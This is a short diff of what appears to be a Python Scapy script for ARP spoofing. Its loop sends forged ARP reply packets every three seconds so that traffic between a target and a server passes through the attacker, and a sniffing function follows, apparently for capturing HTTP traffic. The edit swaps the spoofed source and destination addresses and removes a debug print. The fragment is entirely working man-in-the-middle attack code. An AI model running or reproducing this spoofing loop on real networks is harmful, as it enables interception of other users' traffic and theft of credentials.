@@ -13,11 +13,11 @@ finished = False
 
 load_layer("http")
 
+target_MAC, server_MAC = None, None
 
 def ARP_loop(tar, ser):
     while not finished:
-        print(f"\nsending arp with pdst: {tar} and psrc: {ser}")
-        sendp(ARP(op=2, pdst=tar, psrc=ser), iface=interface, verbose=False)
+        send(ARP(op=2, pdst=ser, psrc=tar), iface=interface, verbose=False)
         time.sleep(3)
 
 def sniff_sniff():
